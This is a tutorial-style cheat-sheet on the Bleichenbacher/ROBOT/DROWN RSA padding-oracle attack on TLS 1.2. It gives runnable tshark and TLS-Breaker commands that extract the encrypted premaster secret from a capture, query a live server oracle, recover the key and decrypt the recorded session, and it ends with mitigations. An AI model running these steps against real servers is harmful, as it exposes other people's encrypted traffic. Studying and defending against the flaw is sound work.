# Bleichenbacher / ROBOT / DROWN — RSA PKCS#1 v1.5 Oracle

A different padding oracle: this one is on **RSA key transport**, not CBC. When a TLS 1.2
suite uses `TLS_RSA_WITH_*` (static RSA key exchange, no forward secrecy), the client
encrypts the premaster secret under the server's RSA public key with **PKCS#1 v1.5**
padding. If the server's behaviour differs for *conformant vs non-conformant* padding
(distinct alert, timing, or connection state), that single leaked bit is a Bleichenbacher
oracle — Daniel Bleichenbacher, 1998; resurrected as **ROBOT** in 2017.

Decrypting one captured premaster secret lets you derive the session keys and read the
whole TLS session offline. **DROWN** is the SSLv2 cross-protocol variant of the same idea.

## Preconditions

- A cipher suite with **RSA key exchange** (`TLS_RSA_WITH_AES_128_CBC_SHA` etc.).
  TLS 1.3 removed RSA key transport entirely, so this only hits TLS ≤ 1.2.
- A padding-conformity oracle (the server reveals valid vs invalid PKCS#1 v1.5).

## Extract the values from a capture

```bash
# Client random (needed for the keylog line)
tshark -r traffic.pcap -Y "tls.handshake.type == 1" -T fields -e tls.handshake.random

# Encrypted premaster secret from ClientKeyExchange (256 bytes ⇒ 2048-bit RSA)
tshark -r traffic.pcap -Y "tls.handshake.type == 16" -T fields -e tls.handshake.epms

# Confirm the suite is RSA-keyed (mandatory)
tshark -r traffic.pcap -Y "tls.handshake.type == 2" -V | grep -E "Version:|Cipher Suite:"
```

## Run the attack (TLS-Breaker)

```bash
export JAVA_HOME=/usr/lib/jvm/java-11-openjdk-amd64   # needs JDK 11 to build
export PATH="$JAVA_HOME/bin:$PATH"
# git clone https://github.com/tls-attacker/TLS-Breaker ; mvn clean install -DskipTests

java -jar /opt/TLS-Breaker/apps/bleichenbacher-1.0.1.jar \
    -connect TARGET:PORT \
    -encrypted_premaster_secret <EPMS-FROM-PCAP> \
    -executeAttack
# Note: if the capture's IP differs from the live oracle you CANNOT use -pcap;
# pass the captured EPMS explicitly with -encrypted_premaster_secret.
# A complete run ends with "Solution found!" + the 256-byte padded premaster;
# strip everything before the 0303 version bytes to get the unpadded premaster.
```

## Decrypt the captured session

Feed the recovered premaster + client random to Wireshark/tshark as a keylog:

```bash
echo "PMS_CLIENT_RANDOM <CLIENT_RANDOM> <UNPADDED_PREMASTER>" > keys.log
tshark -r traffic.pcap -o "tls.keylog_file:$(pwd)/keys.log" \
       --export-objects http,/tmp/httpdump
cat /tmp/httpdump/*
```

Wireshark derives `master_secret = PRF(premaster, "master secret", client_random +
server_random)`, then the AES + HMAC keys, and decrypts the body.

## Query economics (why it's slow over a network)

Each probe leaks **one bit** (PKCS#1 conformant or not). A 2048-bit modulus typically
needs **20,000–80,000** adaptive probes; each probe is a full fresh handshake. At
~1.5 probes/s over the Internet that is hours — a `BAD_RECORD_MAC` alert is the negative
oracle response, a normal `ServerHello…` chain is positive. Local/LAN oracles are far
faster; ROBOT's whole point was that the bug survived on major load balancers.

## Mitigations

- **Disable RSA key-exchange suites** (TLS 1.3 already forbids them; forward-secret
  ECDHE/DHE only on 1.2).
- **Constant-time PKCS#1 handling** — the TLS spec mandates returning a *random* PMS on
  padding failure so behaviour is identical; many stacks got this wrong (ROBOT).
- Disable **SSLv2** to close the DROWN downgrade path. Patch BIG-IP / NetScaler / JSSE /
  OpenSSL / GnuTLS / BouncyCastle — all shipped ROBOT fixes.
